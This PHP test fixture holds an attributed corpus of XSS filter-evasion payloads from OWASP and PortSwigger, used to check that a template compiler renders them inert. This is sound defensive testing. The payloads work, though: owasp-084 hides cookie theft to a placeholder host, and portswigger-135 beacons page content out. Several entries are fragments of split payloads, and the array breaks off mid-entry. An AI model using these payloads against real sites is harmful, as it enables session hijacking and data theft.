<?php

declare(strict_types=1);

// M1 release-readiness: the expanded §7.2 threat corpus.
//
// Sources (public, attribution preserved per-vector):
//   - OWASP Cheat Sheet Series, "XSS Filter Evasion" (CC BY-SA 4.0)
//     https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
//   - PortSwigger Web Security Academy, "XSS cheat sheet"
//     https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
//
// Every payload rides a dynamic child (the c() lane) and, when
// URL/scheme-shaped, a dynamic URL attribute (the u() lane). The
// companion PHPUnit test (ExpandedThreatCorpusTest) compiles each
// source with the real lintl binary, executes the compiled PHP under
// real PHP, and asserts the rendered output carries NO live attack
// surface. A compile-time validator rejection (LNL0301 etc.) is the
// strongest inertness and is counted as a passing vector.

namespace Lintl\Tests;

final class ExpandedThreatCorpus
{
    /** @return array<string, array{payload: string, attribution: string, url_shaped: bool}> */
    public static function vectors(): array
    {
        return [
            'owasp-000' => [
                'payload' => '<SCRIPT SRC=https://example.com/xss-test.js></SCRIPT>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-001' => [
                'payload' => 'javascript:/*--></title></style></textarea></script></xmp>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-002' => [
                'payload' => '<svg/onload=\'+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//\'>',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-003' => [
                'payload' => '<a onmouseover="alert(document.cookie)">xxs link</a>',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-004' => [
                'payload' => '<a onmouseover=alert(document.cookie)>xxs link</a>',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-005' => [
                'payload' => '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-006' => [
                'payload' => '<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-007' => [
                'payload' => '<IMG SRC=# onmouseover="alert(\'xxs\')">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-008' => [
                'payload' => '<IMG SRC= onmouseover="alert(\'xxs\')">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-009' => [
                'payload' => '<IMG onmouseover="alert(\'xxs\')">',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-010' => [
                'payload' => '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-011' => [
                'payload' => '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-012' => [
                'payload' => '<a href="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#39&#88&#83&#83&#39&#41">Click Me!</a>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-013' => [
                'payload' => '<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-014' => [
                'payload' => '<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-015' => [
                'payload' => '<a href="jav&#09;ascript:alert(\'XSS\');">Click Me</a>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-016' => [
                'payload' => '<a href="jav&#x09;ascript:alert(\'XSS\');">Click Me</a>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-017' => [
                'payload' => '<a href="jav&#10;ascript:alert(\'XSS\');">Click Me</a>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-018' => [
                'payload' => '<a href="jav&#13;ascript:alert(\'XSS\');">Click Me</a>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-019' => [
                'payload' => '<IMG SRC=java\\0script:alert("XSS")>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-020' => [
                'payload' => '<a href="  javascript:alert(\'XSS\');">Click Me</a>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-021' => [
                'payload' => '<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-022' => [
                'payload' => '<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-023' => [
                'payload' => '<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-024' => [
                'payload' => '<<SCRIPT>alert("XSS");//<</SCRIPT>',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-025' => [
                'payload' => '<SCRIPT SRC=http://xss.rocks/xss.js?< B >',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-026' => [
                'payload' => '<SCRIPT SRC=//xss.rocks/.j>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-027' => [
                'payload' => '<IMG SRC="`<javascript:alert>`(\'XSS\')"',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-028' => [
                'payload' => '";alert(\'XSS\');//',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-029' => [
                'payload' => '</script><script>alert(\'XSS\');</script>',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-030' => [
                'payload' => '</TITLE><SCRIPT>alert("XSS");</SCRIPT>',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-031' => [
                'payload' => '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-032' => [
                'payload' => '<BODY BACKGROUND="javascript:alert(\'XSS\')">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-033' => [
                'payload' => '<IMG DYNSRC="javascript:alert(\'XSS\')">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-034' => [
                'payload' => '<IMG LOWSRC="javascript:alert(\'XSS\')">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-035' => [
                'payload' => '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-036' => [
                'payload' => '<IMG SRC=\'vbscript:msgbox("XSS")\'>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-037' => [
                'payload' => '<svg/onload=alert(\'XSS\')>',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-038' => [
                'payload' => '<BODY ONLOAD=alert(\'XSS\')>',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-039' => [
                'payload' => '<BGSOUND SRC="javascript:alert(\'XSS\');">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-040' => [
                'payload' => '<BR SIZE="&{alert(\'XSS\')}">',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-041' => [
                'payload' => '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-042' => [
                'payload' => '<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-043' => [
                'payload' => '<STYLE>@import\'http://xss.rocks/xss.css\';</STYLE>',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-044' => [
                'payload' => '<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-045' => [
                'payload' => '<STYLE>@im\\port\'\\ja\\vasc\\ript:alert("XSS")\';</STYLE>',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-046' => [
                'payload' => '<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-047' => [
                'payload' => '<STYLE>.XSS{background-image:url("javascript:alert(\'XSS\')");}</STYLE><A CLASS=XSS></A>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-048' => [
                'payload' => '<STYLE type="text/css">BODY{background:url("javascript:alert(\'XSS\')")}</STYLE>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-049' => [
                'payload' => '<STYLE type="text/css">BODY{background:url("<javascript:alert>(\'XSS\')")}</STYLE>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-050' => [
                'payload' => '<XSS STYLE="xss:expression(alert(\'XSS\'))">',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-051' => [
                'payload' => '<XSS STYLE="behavior: url(xss.htc);">',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-052' => [
                'payload' => '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-053' => [
                'payload' => '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-054' => [
                'payload' => '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-055' => [
                'payload' => '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-056' => [
                'payload' => '<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-057' => [
                'payload' => '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-058' => [
                'payload' => '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-059' => [
                'payload' => '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-060' => [
                'payload' => '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-061' => [
                'payload' => '<DIV STYLE="background-image:\\0075\\0072\\006C\\0028\'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029\'\\0029">',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-062' => [
                'payload' => '<DIV STYLE="width: expression(alert(\'XSS\'));">',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-063' => [
                'payload' => '<!--[if gte IE 4]><SCRIPT>alert(\'XSS\');</SCRIPT><![endif]-->',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-064' => [
                'payload' => '<BASE HREF="javascript:alert(\'XSS\');//">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-065' => [
                'payload' => '<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-066' => [
                'payload' => '<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert(\'XSS\')"></B></I></XML>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-067' => [
                'payload' => '<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-068' => [
                'payload' => '<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-069' => [
                'payload' => '<? echo(\'<SCR)\';echo(\'IPT>alert("XSS")</SCRIPT>\'); ?>',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-070' => [
                'payload' => '<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-071' => [
                'payload' => '<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'XSS\')</SCRIPT>">',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-072' => [
                'payload' => '<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-073' => [
                'payload' => '<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-074' => [
                'payload' => '<SCRIPT a=">" \'\' SRC="httx://xss.rocks/xss.js"></SCRIPT>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-075' => [
                'payload' => '<SCRIPT "a=\'>\'" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-076' => [
                'payload' => '<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-077' => [
                'payload' => '<SCRIPT a=">\'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-078' => [
                'payload' => '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-079' => [
                'payload' => '<A HREF="http://66.102.7.147/">XSS</A>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-080' => [
                'payload' => '<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-081' => [
                'payload' => '<A HREF="http://1113982867/">XSS</A>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-082' => [
                'payload' => '<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-083' => [
                'payload' => '<A HREF="http://0102.0146.0007.00000223/">XSS</A>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-084' => [
                'payload' => '<img onload="eval(atob(\'ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU=\'))">',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-085' => [
                'payload' => '<A HREF="h',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-086' => [
                'payload' => 'tt  p://6 6.000146.0x7.147/">XSS</A>',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-087' => [
                'payload' => '<A HREF="//www.google.com/">XSS</A>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-088' => [
                'payload' => '<A HREF="http://google.com/">XSS</A>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-089' => [
                'payload' => '<A HREF="http://www.google.com./">XSS</A>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-090' => [
                'payload' => '<A HREF="javascript:document.location=\'http://www.google.com/\'">XSS</A>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-091' => [
                'payload' => '<A HREF="http://www.google.com/ogle.com/">XSS</A>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-092' => [
                'payload' => '<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-093' => [
                'payload' => '<Video> <source onerror = "javascript: alert (XSS)">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-094' => [
                'payload' => '<Input value = "XSS" type = text>',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-095' => [
                'payload' => '<applet code="javascript:confirm(document.cookie);">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-096' => [
                'payload' => '<isindex x="javascript:" onmouseover="alert(XSS)"></SCRIPT>\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-097' => [
                'payload' => '"><img src="x:x" onerror="alert(XSS)',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-098' => [
                'payload' => '"><iframe src="javascript:alert(XSS)',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-099' => [
                'payload' => '<object data="javascript:alert(XSS)">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-100' => [
                'payload' => '<isindex type=image src=1 onerror=alert(XSS)>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-101' => [
                'payload' => '<img src=x:alert(alt) onerror=eval(src) alt=0>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-102' => [
                'payload' => '<img src="x:gif" onerror="window[\'al\\u0065rt\'](0)"></img>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-103' => [
                'payload' => '<iframe/src="data:text/html,<svg onload=alert(1)>">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-104' => [
                'payload' => '<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-105' => [
                'payload' => '<svg><script xlink:href=data&colon;,window.open(\'https://www.google.com/\')></script>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-106' => [
                'payload' => '<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-107' => [
                'payload' => '<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-108' => [
                'payload' => '<form><a href="javascript:\\u0061lert(1)">X</a></form>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-109' => [
                'payload' => '</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror=\'eval(src)\'>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-110' => [
                'payload' => '<img src="/" =_=" title="onerror=\'prompt(1)\'">',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-111' => [
                'payload' => '<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe</a>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-112' => [
                'payload' => '<script x> alert(1) </script 1=2>',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-113' => [
                'payload' => '<form><button formaction=javascript&colon;alert(1)>CLICKME</button></form>',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-114' => [
                'payload' => '<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-115' => [
                'payload' => '<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-116' => [
                'payload' => '<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>',
                'attribution' => 'OWASP',
                'url_shaped' => true,
            ],
            'owasp-117' => [
                'payload' => '(alert)(1)',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-118' => [
                'payload' => 'a=alert,a(1)',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-119' => [
                'payload' => '[1].find(alert)',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-120' => [
                'payload' => 'top["al"+"ert"](1)',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-121' => [
                'payload' => 'top[/al/.source+/ert/.source](1)',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-122' => [
                'payload' => 'al\\u0065rt(1)',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-123' => [
                'payload' => 'top[\'al\\145rt\'](1)',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-124' => [
                'payload' => 'top[\'al\\x65rt\'](1)',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-125' => [
                'payload' => 'top[8680439..toString(30)](1)',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-126' => [
                'payload' => 'alert?.()',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-127' => [
                'payload' => '(alert())',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'owasp-128' => [
                'payload' => '${alert``}',
                'attribution' => 'OWASP',
                'url_shaped' => false,
            ],
            'portswigger-129' => [
                'payload' => '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-130' => [
                'payload' => '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-131' => [
                'payload' => '<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-132' => [
                'payload' => '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-133' => [
                'payload' => '<input type=hidden id=x onbeforematch=alert(1) hidden=until-found>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-134' => [
                'payload' => '<body onbeforeprint=console.log(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-135' => [
                'payload' => '<body onbeforeunload=navigator.sendBeacon(\'//ssl.portswigger-labs.net/\',document.body.innerHTML)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-136' => [
                'payload' => '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-137' => [
                'payload' => '<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-138' => [
                'payload' => '<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-139' => [
                'payload' => '<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-140' => [
                'payload' => '<input type=hidden oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-141' => [
                'payload' => '<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-142' => [
                'payload' => '1',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-143' => [
                'payload' => '00:00:00.000 --> 00:00:05.000 ',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-144' => [
                'payload' => '<b>XSS</b>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-145' => [
                'payload' => '"></video>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-146' => [
                'payload' => '<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-147' => [
                'payload' => '<svg><animate onend=alert(1) attributeName=x dur=1s>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-148' => [
                'payload' => '<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-149' => [
                'payload' => '<audio src/onerror=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-150' => [
                'payload' => '<a id=x tabindex=1 onfocus=alert(1)></a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-151' => [
                'payload' => '<xss onfocus=alert(1) autofocus tabindex=1>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-152' => [
                'payload' => '<a id=x tabindex=1 onfocusin=alert(1)></a>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-153' => [
                'payload' => '<body onhashchange="print()">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-154' => [
                'payload' => '<body onload=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-155' => [
                'payload' => '<audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-156' => [
                'payload' => '<audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-157' => [
                'payload' => '<audio onloadstart="alert(1)"><source>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-158' => [
                'payload' => '<body onmessage=print()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-159' => [
                'payload' => '<body onpagereveal=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-160' => [
                'payload' => '<body onpageshow=alert(1)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-161' => [
                'payload' => '<audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-162' => [
                'payload' => '<audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-163' => [
                'payload' => '<body onpopstate=print()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-164' => [
                'payload' => '<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-165' => [
                'payload' => '<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-166' => [
                'payload' => '<body onresize="print()">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-167' => [
                'payload' => '<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-168' => [
                'payload' => '<address onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-169' => [
